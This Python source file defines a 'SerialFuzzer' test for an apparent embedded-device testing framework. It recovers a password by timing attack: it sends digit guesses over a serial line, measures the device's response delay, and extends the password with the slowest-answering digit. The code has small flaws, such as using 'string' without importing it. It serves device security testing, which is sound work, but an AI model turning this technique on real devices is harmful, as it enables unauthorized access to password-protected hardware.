from . import test
from . import signal
from .exceptions import PlaybackDeviceException

class SerialFuzzer(test.DeviceTest):
    test_name = 'Serial Fuzzer'

    parameters = [
    ]

    relevant_inputs = [
        test.TestIOMapping('Serial')
    ]
    relevant_outputs = [
        test.TestIOMapping('Reset'),
        test.TestIOMapping('RecordedSerial'),
        test.TestIOMapping('Valid')
    ]

    def run(self, inputs, outputs): 
        serialout = self.relevant_input_values[0]
        reset = self.relevant_input_values[0]
        recorded_serial = self.relevant_output_values[1]
        valid = self.relevant_output_values[2]

        password = ''
        while 1:
            durations = []

            for c in string.digits:
                data = password + c + '\n'
                serialout.signal = signal.Signal(initial_value=signal.HIGH, duration=0.05, sample_rate=9600).append(signal.RS232Signal(data=data, baud_rate=9600, duration=1.0))

                #self.environment.plot(['inputs'])
                self.send_inputs(inputs, outputs)
                #self.environment.plot(['outputs', str(list(reset.signal.changes())[-2][0]), str(reset.signal.duration)])

                if valid.signal.final_value == 1:
                    t1 = list(recorded_serial.signal.changes())[-1][0]
                    t2 = list(valid.signal.changes())[-1][0]

                    print(password + c, t2-t1)
                    durations.append((c, t2-t1))

                else:
                    password += c
                    print('Password is', password)
                    return

            best_char = max(durations, key=lambda d: d[1])[0]
            password += best_char
            print('Building password:', password)